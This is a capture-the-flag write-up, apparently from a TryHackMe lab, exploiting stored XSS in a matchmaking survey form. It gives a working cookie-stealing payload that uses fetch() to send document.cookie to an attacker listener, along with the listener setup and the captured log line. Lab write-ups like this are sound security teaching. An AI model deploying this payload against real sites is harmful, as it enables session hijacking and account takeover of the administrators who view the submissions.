# Valentine's Day Matchmaking Survey - CTF Writeup

## Challenge Information
- **Challenge Name:** Valentine's Day Matchmaking Survey
- **Target:** Survey/Registration Form
- **Vulnerability:** Stored Cross-Site Scripting (XSS)

## Reconnaissance

The challenge presented a Valentine's Day matchmaking survey form with multiple input fields designed to collect user information for a dating service. The form contained the following fields:

**About You Section:**
- Name (required)
- Age (required)
- Gender (required) - Dropdown selection
- Seeking (required) - Dropdown selection

**Get to Know You Section:**
- "What's your idea of a perfect Valentine's Day date?" (required) - Long text field
- "Describe yourself in 3-5 words" (required) - Short text field
- "What are you looking for in a partner?" (required) - Long text field
- "Any dealbreakers or things to avoid?" - Optional text field

**Critical Clues in Form:**
1. "Our team reads every word! Be creative and specific."
2. "The more detail you provide, the better we can match you!"
3. "**Our team typically reviews submissions within a minute.**"
4. "Your information is confidential and will only be used for matchmaking purposes."

These messages strongly suggested that **human administrators manually review every submission**, creating an opportunity for Stored XSS attacks.


## Exploitation

### Step 1: Setting Up Attack Infrastructure

Established an HTTP listener on the attacking machine to capture stolen cookies:

```bash
python3 -m http.server 4444
```

Output:
```
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

This listener would capture any HTTP requests containing stolen session data.

### Step 2: Crafting XSS Payload

Created a cookie-stealing XSS payload designed to:
1. Execute when the admin views the submission
2. Extract the admin's session cookies
3. Send the cookies to the attacker's listener
4. Work reliably across different browsers

**Payload Used:**
```html
<img src=x onerror=fetch('http://10.80.124.81:4444/?cookie='+document.cookie)>
```

**Payload Breakdown:**
- `<img src=x>` - Creates an invalid image element that will fail to load
- `onerror=` - Event handler that triggers when image fails to load
- `fetch('http://10.80.124.81:4444/?cookie='+document.cookie)` - Sends GET request to attacker's server with victim's cookies

**Why This Payload Works:**
- Doesn't rely on `<script>` tags (often filtered)
- Uses event handler (harder to detect)
- Automatically executes without user interaction
- Compatible with most browsers
- Compact and easily injected into form fields

### Step 3: Submitting Malicious Survey

Filled out the survey form with the XSS payload injected into one or more text fields:

**Example Submission:**
```
Name: John Doe
Age: 25
Gender: Male
Seeking: Male

Perfect Valentine's Day date: 
<img src=x onerror=fetch('http://10.80.124.81:4444/?cookie='+document.cookie)>

Describe yourself: Creative, funny, adventurous

Looking for in partner: Someone genuine and kind

Dealbreakers: None
```

The payload was strategically placed in the "perfect date" field where admins would naturally expect creative, detailed responses.

### Step 4: Admin Review Triggers Payload

Within approximately one minute (as stated in the form), an administrator accessed the review panel to read the submission. When the admin's browser rendered the submission:

1. The browser attempted to load the image from invalid source `src=x`
2. Loading failed, triggering the `onerror` event handler
3. The JavaScript code executed in the **admin's browser context**
4. `document.cookie` accessed the admin's session cookies
5. `fetch()` sent an HTTP GET request to the attacker's listener
6. The cookies were transmitted as a URL parameter

### Step 5: Cookie Extraction

The attacker's HTTP listener received the incoming request:

```bash
10.80.130.63 - - [14/Feb/2026 11:12:07] "GET /?cookie=flag=THM{...} HTTP/1.1" 200 -
```

**Analysis of Captured Data:**
- **Source IP:** 10.80.130.63 (admin's machine/server)
- **Request Path:** `/?cookie=flag=THM{...}`
- **Cookie Data:** The admin's session cookie contained the flag
- **Response Code:** 200 (request successfully received)



